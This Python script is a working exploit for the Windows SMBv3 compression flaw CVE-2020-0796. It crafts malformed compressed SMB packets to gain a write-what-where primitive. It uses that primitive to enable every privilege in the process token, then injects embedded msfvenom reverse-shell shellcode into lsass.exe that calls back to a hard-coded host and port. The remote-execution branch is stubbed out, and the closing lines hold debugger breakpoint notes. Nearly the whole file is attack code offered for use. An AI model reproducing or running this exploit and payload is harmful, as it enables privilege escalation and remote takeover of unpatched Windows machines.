#!/usr/bin/env python3

import os, socket, struct, sys
from libs import lznt1, smb

# import shared exploit libs
sys.path.append(os.path.abspath(os.path.join('..')))
from libs import win_lpe as lpe

def send(s, pkt):
    s.send(pkt)


def recv(s):
    nb, = struct.unpack(">I", s.recv(4))
    return s.recv(nb)


def send_and_recv(s, pkt):
    s.send(pkt)
    return recv(s)


def set_up_socket(ip, port=445, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((ip, port))
    return s


def get_what_where_LPE():
    # explained in detail here: https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt

    # _TOKEN structure contains _SEP_TOKEN_PRIVILEGES at pToken + 0x40
    # ulonglong Present (pToken + 0x40) indicates which privileges exist
    # ulonglong Enabled (pToken + 0x48) indicates which privileges are enabled
    # ulonglong EnabledByDefault (pToken + 0x50) indicates initial state of the token
    
    addr = lpe.leak_process_token_addr()
    if not addr: exit(-1)
    # all privs exist, enabled, and enabled by default
    priv_bitmask = (0xFFFFFFFFFFFFFFFF >> 0x1E) << 2
    priv_bitmask = struct.pack("<Q", priv_bitmask)
    return priv_bitmask * 3, addr + 0x40

def write_what_where(s, what, where):
    if len(what) <= 1 or len(what) > 0x1100:
        print("Payload must be larger than 1 byte and smaller than 0x1100 bytes")
        exit(-1)
    
    # 0xffffffff + len(what) = len(what) - 1 
    # SrvNetAlloocateBuffer of len(what) -1, this is not true allocation size though
    # compressed_data is decompressed and placed at buf + len("what") (OOB write)
    # "what" is copied to a pointer that we can control with the OOB write
    # for a write what where.

    # memory is allocated in pools, lowest size pool is 0x1100
    # overwrite padding + into header to change address for memcpy
    pad = b"A" * (0x1118 - len(what))
    uncompressed_data = pad + struct.pack("<Q", where)
    compressed_data = lznt1.compress(uncompressed_data)

    send_and_recv(s, smb.NegotiateProtocolRequestPacket())
    send_and_recv(s, smb.SessionSetupRequestPacket())
    send(s, smb.CompressedPacket(0xffffffff, len(what), what, compressed_data))


if __name__ == "__main__":

    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=8888 -f python
    buf =  b""
    buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
    buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
    buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
    buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
    buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
    buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
    buf += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
    buf += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
    buf += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
    buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
    buf += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
    buf += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
    buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
    buf += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    buf += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    buf += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32"
    buf += b"\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec"
    buf += b"\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x22\xb8"
    buf += b"\xc0\xa8\x7a\x01\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41"
    buf += b"\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01"
    buf += b"\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50"
    buf += b"\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48"
    buf += b"\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
    buf += b"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
    buf += b"\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02"
    buf += b"\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41"
    buf += b"\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a"
    buf += b"\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
    buf += b"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50"
    buf += b"\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
    buf += b"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86"
    buf += b"\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08"
    buf += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6"
    buf += b"\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a"
    buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59"
    buf += b"\x41\x89\xda\xff\xd5"

    if len(sys.argv) > 2:
        print("Usage: exploit.py [IP]\nIf IP is omitted, LPE is attempted.")
        exit(-1)
    if len(sys.argv) == 2:
        ip = sys.argv[1]
        print(f"CVE-2020-0796 RCE payload => {ip}")
        exit()
        s = set_up_socket(ip)
        write_what_where(s, b"A" * 0x8, 0xDEADBEEFCAFEBABE)
    else:
        print(f"CVE-2020-0796 LPE payload")
        s = set_up_socket("127.0.0.1")
        what, where = get_what_where_LPE()
        write_what_where(s, what, where)
        victim_process = "lsass.exe"
        print("[+] Used write what where to modify token privileges")
        print(f"[+] injecting shellcode into {victim_process}")
        lpe.inject_shellcode_into_process(buf, victim_process)
        #lpe.trigger_printer_bug()
        #lpe.se_impersonate_privilege_and_printer_bug(shellcode)
        #os.system('cmd.exe')

# useful windbg commands
# .reload; bp srv2!Srv2DecompressData+0x108; g; r rcx; db rdx; g; gN; g;
# .reload; bp srv2!Srv2DecompressData+0x108; g; r rcx; db rdx;
# g; r rcx; db rdx;